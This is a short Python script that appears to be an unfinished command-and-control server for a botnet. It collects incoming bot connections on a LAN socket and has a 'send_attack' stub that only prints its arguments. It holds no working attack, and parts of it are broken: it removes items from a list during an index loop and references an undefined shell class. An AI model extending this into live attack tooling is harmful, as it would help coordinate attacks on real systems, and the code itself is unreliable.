#!/usr/bin/env python3
import socket

connections = []
addresses = []

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("192.168.1.36",7000))
s.listen()

def catcher(s):
    while True:
        conn, addr = s.accept()
        connections.append(conn)
        addresses.append(addr)
        print(f"[+] {addr[0]}:{addr[1]} added!")

def check_conns():
    for i in range(len(connections)): 
        try:
            connections[i].send(b"a")
            connections[i].send(b"a")
        except:
            connections.pop(i)

def send_attack(target,id_attack):
    print(target,id_attack)

"""
shell = C2cmd()

x = threading.Thread(target=catcher, args=(s,))
y = threading.Thread(target=shell.cmdloop())
x.start()
y.start()
"""


